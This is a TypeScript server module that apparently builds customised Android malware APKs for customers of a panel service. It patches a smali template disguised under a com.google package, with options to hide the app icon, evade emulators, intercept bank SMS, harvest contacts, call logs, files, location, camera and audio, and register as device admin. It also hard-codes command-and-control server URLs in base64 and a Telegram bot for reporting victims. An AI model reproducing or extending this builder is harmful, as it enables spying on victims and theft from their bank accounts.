import { EventStreamResponse } from "@/lib/event-stream";
import { randomUUID } from "crypto";
import fs from "fs/promises";
import path from "path";
import { Buffer } from "buffer";
import { exec } from "child_process";
import util from "util";
import sharp from "sharp";

const execPromise = util.promisify(exec);

interface BuildData {
  userId: string;
  username: string;
  appName: string;
  appIcon?: string;
  htmlFile?: string;
  template: string;
  securityOptions: {
    isAntiEmulator: boolean;
    isBankSmsOnly: boolean;
    isHideApplication: boolean;
    isGetCallLogs: boolean;
    isGetContacts: boolean;
    sendConnectionInfo: boolean;
    isAccessAllFiles: boolean;
    isAccessGallery: boolean;
    isAccessHiddenFolders: boolean;
    isDeviceAdmin: boolean;
    isReadSms?: boolean;
    isSendSms?: boolean;
    isAccessLocation?: boolean;
    isRecordAudio?: boolean;
    isAccessCamera?: boolean;
    isReadPhoneState?: boolean;
    isAccessCoarseLocation?: boolean;
    isReadCallLog?: boolean;
    isWriteCallLog?: boolean;
    isWriteContacts?: boolean;
    isReadCalendar?: boolean;
    isWriteCalendar?: boolean;
    isReadPhoneNumbers?: boolean;
  };
  telegramConfig?: {
    chatId: string;
    botToken: string;
  };
}

interface BuildProcess {
  id: string;
  status: "pending" | "building" | "success" | "failed";
  logs: Array<{ type: string; message: string; timestamp: string }>;
  downloadUrl?: string;
  apkPath?: string;
  apkBuffer?: Buffer;
}

const activeBuilds = new Map<string, BuildProcess>();
const activeConnections = new Map<string, EventStreamResponse>();

// Constants for file paths
const APK_RESOURCES_DIR = path.join(process.cwd(), "apk-resources");
const DSRC_DIR = path.join(APK_RESOURCES_DIR, "dsrc");
const DSRC_BUILD_DIR = path.join(DSRC_DIR, "build");
const TEMPLATES_DIR = path.join(APK_RESOURCES_DIR, "tamplate");
const BACKUP_DIR = path.join(APK_RESOURCES_DIR, "back");
const BUILD_OUTPUT_DIR = path.join(process.cwd(), "public", "apks");
const APKTOOL_PATH = path.join(APK_RESOURCES_DIR, "apktool.jar");
const APKSIGNER_PATH = path.join(APK_RESOURCES_DIR, "apksigner.jar");
const DEBUG_KEYSTORE = path.join(APK_RESOURCES_DIR, "debug.keystore");
const WS_SERVER_URL = process.env.WS_SERVER_URL || "wss://panel.flare-labs.tech/";
const API_SERVER_URL = process.env.API_SERVER_URL || "https://panel.flare-labs.tech/api";
 
export class BuilderService {
  static async startBuild(buildData: BuildData): Promise<{ buildId: string }> {
    const buildId = randomUUID();

    const buildProcess: BuildProcess = {
      id: buildId,
      status: "pending",
      logs: [
        {
          type: "info",
          message: "Build initialized",
          timestamp: new Date().toISOString(),
        },
      ],
    };

    activeBuilds.set(buildId, buildProcess);
    this.processBuild(buildId, buildData);

    return { buildId };
  }

  static attachConnection(buildId: string, stream: EventStreamResponse) {
    const existingConnection = activeConnections.get(buildId);
    if (existingConnection) {
      existingConnection.close();
    }

    activeConnections.set(buildId, stream);
    const process = activeBuilds.get(buildId);
    if (process) {
      process.logs.forEach((log) => {
        stream.send({
          type: log.type,
          message: log.message,
          timestamp: log.timestamp,
        });
      });
    }
  }

  static async processBuild(buildId: string, buildData: BuildData) {
    const buildProcess = activeBuilds.get(buildId);
    if (!buildProcess) return;

    try {
      buildProcess.status = "building";
      this.addLog(buildId, "info", "Starting build process...");

      // Step 1: Clean only the build directory
      await this.cleanBuildDirectory(buildId);

      // Step 2: Handle template
      await this.handleTemplate(buildId, buildData);

      // Step 3: Handle app icon
      if (buildData.appIcon) {
        await this.handleAppIcon(buildId, buildData.appIcon);
      }

      // Step 3.1: Update res/values/strings.xml
      await this.updateValues(buildId, buildData);
      // Step 4: Update AndroidManifest.xml
      await this.updateAndroidManifest(buildId, buildData);

      // Step 5: Update Config.smali
      await this.updateConfigSmali(buildId, buildData);

      // Step 6: Build APK
      const unsignedApkPath = await this.buildApk(buildId, buildData);

      // Step 7: Sign APK
      const signedApkPath = await this.signApk(
        buildId,
        unsignedApkPath,
        buildData
      );

      // Step 8: Move APK to public directory
      const finalApkPath = await this.moveApkToPublic(
        buildId,
        signedApkPath,
        buildData
      );

      // Build completed successfully
      buildProcess.downloadUrl = `/apks/${path.basename(finalApkPath)}`;
      buildProcess.apkPath = finalApkPath;
      buildProcess.status = "success";
      this.addLog(buildId, "success", "Build completed successfully!");
      this.addLog(buildId, "download", finalApkPath);
    } catch (error) {
      console.error(`Build ${buildId} failed:`, error);
      this.addLog(
        buildId,
        "error",
        "Build failed: " +
          (error instanceof Error ? error.message : "Unknown error")
      );
      if (buildProcess) {
        buildProcess.status = "failed";
      }
    } finally {
      this.cleanupBuild(buildId);
    }
  }

  private static async cleanBuildDirectory(buildId: string) {
    try {
      this.addLog(buildId, "info", "Cleaning build directory...");

      // Only clean the dsrc/build directory if it exists
      try {
        await fs.access(DSRC_BUILD_DIR);
        await fs.rm(DSRC_BUILD_DIR, { recursive: true, force: true });
        this.addLog(buildId, "success", "Build directory cleaned");
      } catch (err) {
        this.addLog(buildId, "info", "No existing build directory to clean");
      }
    } catch (error) {
      this.addLog(buildId, "error", "Failed to clean build directory");
      throw error;
    }
  }

  private static async handleTemplate(buildId: string, buildData: BuildData) {
    try {
      this.addLog(buildId, "info", "Processing template...");

      // Ensure assets directory exists
      const assetsDir = path.join(DSRC_DIR, "assets");
      await fs.mkdir(assetsDir, { recursive: true });

      let templateHtmlPath: string;

      if (buildData.template === "custom") {
        if (!buildData.htmlFile) {
          throw new Error("Custom template requires an HTML file");
        }

        this.addLog(buildId, "info", "Using custom HTML template");
        // Decode base64 HTML file
        const htmlContent = Buffer.from(
          buildData.htmlFile.split(",")[1],
          "base64"
        ).toString("utf-8");
        templateHtmlPath = path.join(assetsDir, "index.html");
        await fs.writeFile(templateHtmlPath, htmlContent);
      } else {
        const templateFile = `${buildData.template}.html`;
        const sourcePath = path.join(TEMPLATES_DIR, templateFile);

        this.addLog(buildId, "info", `Using ${buildData.template} template`);

        try {
          await fs.access(sourcePath);
          templateHtmlPath = path.join(assetsDir, "index.html");
          await fs.copyFile(sourcePath, templateHtmlPath);
        } catch (err) {
          throw new Error(`Template file not found: ${templateFile}`);
        }
      }

      this.addLog(buildId, "success", "Template processed successfully");
    } catch (error) {
      this.addLog(buildId, "error", "Failed to process template");
      throw error;
    }
  }

  private static async handleAppIcon(buildId: string, appIconBase64: string) {
    try {
      this.addLog(buildId, "info", "Processing app icon...");

      const drawableDir = path.join(DSRC_DIR, "res", "drawable");
      await fs.mkdir(drawableDir, { recursive: true });

      const iconPath = path.join(drawableDir, "empty.png");
      const iconData = appIconBase64.split(",")[1];
      const buffer = Buffer.from(iconData, "base64");

      await sharp(buffer).png().toFile(iconPath);

      this.addLog(buildId, "success", "App icon processed successfully");
    } catch (error) {
      this.addLog(buildId, "error", "Failed to process app icon");
      throw error;
    }
  }

  private static async updateAndroidManifest(
    buildId: string,
    buildData: BuildData
) {
    try {
        this.addLog(buildId, "info", "Updating AndroidManifest.xml...");

        const backManifest = path.join(BACKUP_DIR, "AndroidManifest.xml.back");
        let manifestContent = await fs.readFile(backManifest, "utf-8");

        const category = buildData.securityOptions.isHideApplication ? "INFO" : "LAUNCHER";
        manifestContent = manifestContent.replace(
            /android:name="android\.intent\.category\.\{CATAGORY_TYPE\}"/g,
            `android:name="android.intent.category.${category}"`
        );

        // Mapping of togglable permission strings to the securityOptions flag
        // that controls them. Anything in this map is removed from the base
        // manifest and only re-added if its flag is true.
        const TOGGLEABLE_PERMISSIONS: { perm: string; flag: keyof BuildData["securityOptions"] }[] = [
            { perm: "android.permission.READ_CALL_LOG", flag: "isGetCallLogs" },
            { perm: "android.permission.READ_CONTACTS", flag: "isGetContacts" },
            { perm: "android.permission.MANAGE_EXTERNAL_STORAGE", flag: "isAccessAllFiles" },
            { perm: "android.permission.READ_MEDIA_IMAGES", flag: "isAccessGallery" },
            { perm: "android.permission.READ_MEDIA_VIDEO", flag: "isAccessGallery" },
            { perm: "android.permission.READ_MEDIA_AUDIO", flag: "isAccessGallery" },
            { perm: "android.permission.READ_EXTERNAL_STORAGE", flag: "isAccessHiddenFolders" },
            { perm: "android.permission.WRITE_EXTERNAL_STORAGE", flag: "isAccessHiddenFolders" },
            { perm: "android.permission.BIND_DEVICE_ADMIN", flag: "isDeviceAdmin" },
            { perm: "android.permission.READ_SMS", flag: "isReadSms" },
            { perm: "android.permission.SEND_SMS", flag: "isSendSms" },
            { perm: "android.permission.ACCESS_FINE_LOCATION", flag: "isAccessLocation" },
            { perm: "android.permission.ACCESS_COARSE_LOCATION", flag: "isAccessCoarseLocation" },
            { perm: "android.permission.RECORD_AUDIO", flag: "isRecordAudio" },
            { perm: "android.permission.CAMERA", flag: "isAccessCamera" },
            { perm: "android.permission.READ_PHONE_STATE", flag: "isReadPhoneState" },
            { perm: "android.permission.READ_PHONE_NUMBERS", flag: "isReadPhoneNumbers" },
            { perm: "android.permission.READ_CALL_LOG", flag: "isReadCallLog" },
            { perm: "android.permission.WRITE_CALL_LOG", flag: "isWriteCallLog" },
            { perm: "android.permission.WRITE_CONTACTS", flag: "isWriteContacts" },
            { perm: "android.permission.READ_CALENDAR", flag: "isReadCalendar" },
            { perm: "android.permission.WRITE_CALENDAR", flag: "isWriteCalendar" },
        ];

        // Strip every togglable permission from the base manifest, then add
        // back only those whose flag is on.
        for (const { perm } of TOGGLEABLE_PERMISSIONS) {
            const escaped = perm.replace(/\./g, "\\.");
            const re = new RegExp(
                `^[ \\t]*<uses-permission android:name="${escaped}"\\s*/>\\s*\\n?`,
                "gm",
            );
            manifestContent = manifestContent.replace(re, "");
        }

        // Strip the DeviceAdminReceiver block from the base if present
        manifestContent = manifestContent.replace(
            /\s*<receiver[^>]*DeviceAdminReceiver[\s\S]*?<\/receiver>\s*/g,
            "\n",
        );

        const enabledToggles: { perm: string; flag: keyof BuildData["securityOptions"] }[] = [];
        for (const entry of TOGGLEABLE_PERMISSIONS) {
            if (buildData.securityOptions[entry.flag]) {
                enabledToggles.push(entry);
            }
        }

        if (enabledToggles.length > 0) {
            this.addLog(
                buildId,
                "info",
                `Adding ${enabledToggles.length} permission(s) to AndroidManifest.xml: ${enabledToggles.map((t) => t.perm.replace("android.permission.", "")).join(", ")}`
            );

            const seen = new Set<string>();
            const permissionTags: string[] = [];
            for (const { perm } of enabledToggles) {
                if (seen.has(perm)) continue;
                seen.add(perm);
                permissionTags.push(`    <uses-permission android:name="${perm}" />`);
            }

            const permissionBlock = permissionTags.join("\n");
            const lastPermissionRegex = /(<uses-permission android:name="[^"]+"\s*\/>)([^<]*)$/m;
            if (manifestContent.match(lastPermissionRegex)) {
                manifestContent = manifestContent.replace(
                    lastPermissionRegex,
                    `$1\n${permissionBlock}$2`
                );
            } else {
                manifestContent = manifestContent.replace(
                    /(<application\s)/,
                    `${permissionBlock}\n$1`
                );
            }
        } else {
            this.addLog(buildId, "info", "No togglable permissions enabled — manifest kept minimal");
        }

        if (buildData.securityOptions.isDeviceAdmin) {
            this.addLog(buildId, "info", "Adding DeviceAdminReceiver to AndroidManifest.xml");
            const receiverTag = [
                '        <receiver android:enabled="true" android:exported="true" android:name="com.google.xinoshell.receivers.DeviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">',
                '            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />',
                '            <intent-filter>',
                '                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />',
                '            </intent-filter>',
                '        </receiver>',
            ].join('\n');
            const receiverRegex = /(<receiver[^>]*BootReceiver[\s\S]*?<\/receiver>)/;
            if (manifestContent.match(receiverRegex)) {
                manifestContent = manifestContent.replace(
                    receiverRegex,
                    `$1\n${receiverTag}`
                );
            } else {
                manifestContent = manifestContent.replace(
                    /(<application[\s\S]*?)(<activity[\s\S]*?<\/application>)/,
                    `$1${receiverTag}\n        $2`
                );
            }
        }

        const destManifest = path.join(DSRC_DIR, "AndroidManifest.xml");
        await fs.writeFile(destManifest, manifestContent);

        // Log a final count so the user can see what landed
        const finalPermCount = (manifestContent.match(/<uses-permission/g) || []).length;
        this.addLog(buildId, "info", `Final manifest contains ${finalPermCount} <uses-permission> entries`);

        this.addLog(buildId, "success", "AndroidManifest.xml updated successfully");
    } catch (error) {
        this.addLog(buildId, "error", "Failed to update AndroidManifest.xml");
        throw error;
    }
}

  private static async updateValues(buildId: string, buildData: BuildData) {
    try {
      this.addLog(buildId, "info", "Updating res/values/strings.xml...");

      const destManifest = path.join(DSRC_DIR, "res", "values", "strings.xml");
      const backManifest = path.join(BACKUP_DIR, "strings.xml.back");

      let stringsContent = await fs.readFile(backManifest, "utf-8");

      stringsContent = stringsContent.replace(
        /<string name="app">\{APP_NAME\}<\/string>/g,
        `<string name="app">${buildData.appName}</string>`
      );

      await fs.writeFile(destManifest, stringsContent);

      this.addLog(
        buildId,
        "success",
        "res/values/strings.xml updated successfully"
      );
    } catch (error) {
      this.addLog(buildId, "error", "Failed to update res/values/strings.xml");
      throw error;
    }
  }

  private static async updateConfigSmali(
    buildId: string,
    buildData: BuildData
  ) {
    try {
      this.addLog(buildId, "info", "Updating Config.smali...");

      const configBackPath = path.join(BACKUP_DIR, "Config.smali.back");
      const configPath = path.join(
        DSRC_DIR,
        "smali_classes3",
        "com",
        "google",
        "xinoshell",
        "utils",
        "Config.smali"
      );

      let smaliContent = await fs.readFile(configBackPath, "utf-8");

      const safeUserId = buildData.userId || "anonymous";
      const encodedUserId = Buffer.from(String(safeUserId)).toString("base64");
      smaliContent = smaliContent.replace(
        /const-string v0, "\{USER_ID\}"/,
        `const-string v0, "${encodedUserId}"`
      );

      const safeWs = WS_SERVER_URL || "wss://panel.flare-labs.tech/";
      const safeApi = API_SERVER_URL || "https://panel.flare-labs.tech/api";
      smaliContent = smaliContent.replace(
        /const-string v0, "\{SERVER_WS_URL\}"/,
        `const-string v0, "${Buffer.from(String(safeWs)).toString("base64")}"`
      );

      smaliContent = smaliContent.replace(
        /const-string v0, "\{SERVER_API_URL\}"/,
        `const-string v0, "${Buffer.from(String(safeApi)).toString("base64")}"`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isAntiEmulator:Z = (true|false)/,
        `.field public static final isAntiEmulator:Z = ${buildData.securityOptions.isAntiEmulator}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isBankMessageOnly:Z = (true|false)/,
        `.field public static final isBankMessageOnly:Z = ${buildData.securityOptions.isBankSmsOnly}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final sendConnectionToTG:Z = (true|false)/,
        `.field public static final sendConnectionToTG:Z = ${buildData.securityOptions.sendConnectionInfo}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isReadContact:Z = (true|false)/,
        `.field public static final isReadContact:Z = ${buildData.securityOptions.isGetContacts}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isReadCallLogs:Z = (true|false)/,
        `.field public static final isReadCallLogs:Z = ${buildData.securityOptions.isGetCallLogs}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isAccessAllFiles:Z = (true|false)/,
        `.field public static final isAccessAllFiles:Z = ${buildData.securityOptions.isAccessAllFiles}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isAccessGallery:Z = (true|false)/,
        `.field public static final isAccessGallery:Z = ${buildData.securityOptions.isAccessGallery}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isAccessHiddenFolders:Z = (true|false)/,
        `.field public static final isAccessHiddenFolders:Z = ${buildData.securityOptions.isAccessHiddenFolders}`
      );

      smaliContent = smaliContent.replace(
        /\.field public static final isDeviceAdmin:Z = (true|false)/,
        `.field public static final isDeviceAdmin:Z = ${buildData.securityOptions.isDeviceAdmin}`
      );

      if (
        buildData.securityOptions.sendConnectionInfo &&
        buildData.telegramConfig
      ) {
        const encodedBotToken = Buffer.from(
          buildData.telegramConfig.botToken
        ).toString("base64");
        const encodedChatId = Buffer.from(
          buildData.telegramConfig.chatId
        ).toString("base64");

        smaliContent = smaliContent.replace(
          /const-string v0, "\{TG_CONNECTION_TOKEN\}"/,
          `const-string v0, "${encodedBotToken}"`
        );

        smaliContent = smaliContent.replace(
          /const-string v0, "\{TG_CONNECTION_USER\}"/,
          `const-string v0, "${encodedChatId}"`
        );
      } else {
        // Clear Telegram config if not enabled
        smaliContent = smaliContent.replace(
          /const-string v0, "\{TG_CONNECTION_TOKEN\}"/,
          'const-string v0, ""'
        );

        smaliContent = smaliContent.replace(
          /const-string v0, "\{TG_CONNECTION_USER\}"/,
          'const-string v0, ""'
        );
      }

      await fs.writeFile(configPath, smaliContent);

      this.addLog(buildId, "success", "Config.smali updated successfully");
    } catch (error) {
      this.addLog(buildId, "error", "Failed to update Config.smali");
      throw error;
    }
  }

  private static async buildApk(
    buildId: string,
    buildData: BuildData
  ): Promise<string> {
    try {
      this.addLog(buildId, "info", "Building APK with apktool...");

      // Create temporary output directory
      const tempOutputDir = path.join(DSRC_DIR, "dist");
      await fs.mkdir(tempOutputDir, { recursive: true });

      // Build APK using apktool
      const apkName = `${buildData.appName.replace(/[^a-zA-Z0-9]/g, "-")}-${
        buildData.userId
      }`;
      const unsignedApkPath = path.join(
        tempOutputDir,
        `${apkName}-unsigned.apk`
      );

      const { stdout, stderr } = await execPromise(
        `java -jar ${APKTOOL_PATH} b ${DSRC_DIR} -o ${unsignedApkPath}`
      );

      if (stderr) {
        this.addLog(buildId, "debug", `apktool stderr: ${stderr}`);
      }

      this.addLog(buildId, "success", "APK built successfully");
      return unsignedApkPath;
    } catch (error) {
      this.addLog(buildId, "error", "Failed to build APK");
      if (error instanceof Error) {
        this.addLog(buildId, "debug", error.message);
      }
      throw error;
    }
  }

  private static async signApk(
    buildId: string,
    unsignedApkPath: string,
    buildData: BuildData
  ): Promise<string> {
    try {
      this.addLog(buildId, "info", "Signing APK...");

      const signedApkPath = unsignedApkPath.replace(
        "-unsigned.apk",
        "-signed.apk"
      );

      // Sign APK using apksigner
      const { stdout, stderr } = await execPromise(
        `java -jar ${APKSIGNER_PATH} sign --ks ${DEBUG_KEYSTORE} ` +
          `--ks-pass pass:android --out ${signedApkPath} ${unsignedApkPath}`
      );

      if (stderr) {
        this.addLog(buildId, "debug", `apksigner stderr: ${stderr}`);
      }

      this.addLog(buildId, "success", "APK signed successfully");
      return signedApkPath;
    } catch (error) {
      this.addLog(buildId, "error", "Failed to sign APK");
      if (error instanceof Error) {
        this.addLog(buildId, "debug", error.message);
      }
      throw error;
    }
  }

  private static async moveApkToPublic(
    buildId: string,
    signedApkPath: string,
    buildData: BuildData
  ): Promise<string> {
    try {
      this.addLog(buildId, "info", "Moving APK to public directory...");

      // Ensure build output directory exists
      await fs.mkdir(BUILD_OUTPUT_DIR, { recursive: true });

      const cleanAppName = buildData.appName
        .replace(/[^a-zA-Z0-9]/g, "-")
        .toLowerCase();
      const finalApkName = `${cleanAppName}-${
        buildData.userId
      }-${Date.now()}.apk`;
      const finalApkPath = path.join(BUILD_OUTPUT_DIR, finalApkName);

      await fs.rename(signedApkPath, finalApkPath);
      const tempDir = path.join(DSRC_DIR, "dist");
      await fs.rm(tempDir, { recursive: true, force: true });

      this.addLog(buildId, "success", "APK moved to public directory");
      return finalApkName;
    } catch (error) {
      this.addLog(buildId, "error", "Failed to move APK to public directory");
      throw error;
    }
  }

  static addLog(buildId: string, type: string, message: string) {
    const buildProcess = activeBuilds.get(buildId);
    if (!buildProcess) return;

    const logEntry = {
      type,
      message,
      timestamp: new Date().toISOString(),
    };

    buildProcess.logs.push(logEntry);

    const connection = activeConnections.get(buildId);
    if (connection) {
      connection.send(logEntry);
    }
  }

  static getBuildProcess(buildId: string): BuildProcess | undefined {
    return activeBuilds.get(buildId);
  }

  static cleanupBuild(buildId: string) {
    setTimeout(async () => {
      const buildProcess = activeBuilds.get(buildId);
      if (!buildProcess) return;
      if (buildProcess.apkPath) {
        try {
          await fs.rm(buildProcess.apkPath, { force: true });
          this.addLog(buildId, "info", "Temporary APK file cleaned up");
        } catch (error) {
          console.error(
            `Failed to clean up APK file: ${buildProcess.apkPath}`,
            error
          );
        }
      }

      activeBuilds.delete(buildId);
      const connection = activeConnections.get(buildId);
      if (connection) {
        connection.close();
        activeConnections.delete(buildId);
      }
    }, 300000);
  }
}
